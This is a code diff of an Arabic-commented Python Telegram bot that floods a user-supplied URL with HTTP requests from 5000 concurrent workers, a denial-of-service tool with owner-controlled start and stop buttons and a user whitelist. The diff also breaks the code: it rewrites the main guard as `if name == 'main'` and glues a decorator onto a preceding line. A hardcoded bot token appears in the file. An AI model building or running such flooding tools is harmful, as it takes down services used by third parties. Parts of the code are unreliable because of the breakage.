@@ -41,13 +41,15 @@ async def attack(url):
     async with httpx.AsyncClient() as client:
         while not stop_attack_event.is_set():
             try:
-                response = await client.get(url, headers=headers, timeout=5)
+                response = await client.get(url)
                 data = response.content
                 with lock:
                     bytes_transferred += len(data)
                 logging.debug(f"تم إرسال الطلب إلى: {url}")
+            except httpx.RequestError as e:
+                logging.error(f"حدث خطأ في الطلب: {e}")
             except Exception as e:
-                logging.error(f"حدث خطأ: {e}")
+                logging.error(f"حدث خطأ غير متوقع: {e}")
 
 async def start_attack(url):
     """بدء الهجوم عبر عدة خيوط"""
@@ -56,7 +58,7 @@ async def start_attack(url):
     with ThreadPoolExecutor(max_workers=5000) as executor:
         loop = asyncio.get_event_loop()
         for _ in range(5000):
-            tasks.append(loop.run_in_executor(executor, attack, url))
+            tasks.append(loop.run_in_executor(executor, lambda: asyncio.run(attack(url))))
     await asyncio.gather(*tasks)
 
 def stop_attack():
@@ -77,7 +79,7 @@ def calculate_speed():
 # يجب تعيين التوكن بشكل مباشر
 TOKEN = '7317402155:AAHNB3hgGqKXiLqF1OhTYLG78HmTlm8dYI4'  # هنا يجب أن تضع توكن البوت الخاص بك
 if not TOKEN:
-    logging.error("Bot token is not defined")
+    logging.error("لم يتم تعيين رمز البوت")
     raise Exception('Bot token is not defined')
 
 bot = telebot.TeleBot(TOKEN)
@@ -98,9 +100,7 @@ def send_welcome(message):
         markup.add(InlineKeyboardButton("إيقاف الهجوم", callback_data="stop_attack"))
         bot.send_message(message.chat.id, "اختر أحد الأوامر:", reply_markup=markup)
     else:
-        bot.reply_to(message, "أنت لا تملك الصلاحيات الكافية لاستخدام هذا البوت.")
-
-@bot.callback_query_handler(func=lambda call: is_owner(call.message.chat.id))
+        bot.reply_to(message, "أنت لا تملك الصلاحيات الكافية لاستخدام هذا البوت.")@bot.callback_query_handler(func=lambda call: is_owner(call.message.chat.id))
 def callback_query(call):
     """التعامل مع الردود التفاعلية"""
     if call.data == "add_user":
@@ -130,7 +130,8 @@ def process_add_user(message):
             bot.reply_to(message, "حدث خطأ أثناء إضافة المستخدم.")
             logging.error(f"خطأ أثناء إضافة المستخدم: {e}")
     else:
-        bot.reply_to(message، "المستخدم موجود بالفعل في القائمة أو معرف المستخدم غير صحيح")
+        bot.reply_to(message, "المستخدم موجود بالفعل في القائمة أو معرف المستخدم غير صحيح.")
+
 def process_remove_user(message):
     """إزالة مستخدم من القائمة"""
     user_id = message.text.strip()
@@ -140,19 +141,19 @@ def process_remove_user(message):
             with open('normal_users.txt', 'w') as file:
                 for user in NormalUsers:
                     file.write(user + '\n')
-            bot.reply_to(message، "تمت إزالة المستخدم بنجاح.")
+            bot.reply_to(message, "تمت إزالة المستخدم بنجاح.")
             logging.info("تمت إزالة المستخدم بنجاح.")
         except Exception as e:
-            bot.reply_to(message، "حدث خطأ أثناء إزالة المستخدم.")
+            bot.reply_to(message, "حدث خطأ أثناء إزالة المستخدم.")
             logging.error(f"خطأ أثناء إزالة المستخدم: {e}")
     else:
-        bot.reply_to(message، "المستخدم غير موجود في القائمة أو معرف المستخدم غير صحيح.")
+        bot.reply_to(message, "المستخدم غير موجود في القائمة أو معرف المستخدم غير صحيح.")
 
 def process_start_attack(message):
     """بدء هجوم على الهدف المحدد"""
     url = message.text.strip()
     if url:
-        bot.reply_to(message، f"بدء الهجوم على: {url}")
+        bot.reply_to(message, f"بدء الهجوم على: {url}")
         speed_thread = threading.Thread(target=calculate_speed, daemon=True)
         speed_thread.start()
         attack_thread = threading.Thread(target=lambda: asyncio.run(start_attack(url)))
@@ -161,12 +162,12 @@ def process_start_attack(message):
         markup.add(InlineKeyboardButton("إيقاف الهجوم", callback_data="stop_attack"))
         bot.send_message(message.chat.id, "الهجوم جاري. اضغط على الزر أدناه لإيقاف الهجوم:", reply_markup=markup)
     else:
-        bot.reply_to(message، "لم يتم إدخال رابط الهدف بشكل صحيح.")
+        bot.reply_to(message, "لم يتم إدخال رابط الهدف بشكل صحيح.")
         logging.warning("فشل في إدخال رابط الهدف بشكل صحيح.")
 
 def main():
     """تشغيل البوت"""
     bot.polling()
 
-if __name__ == '__main__':
+if name == 'main':
     main()
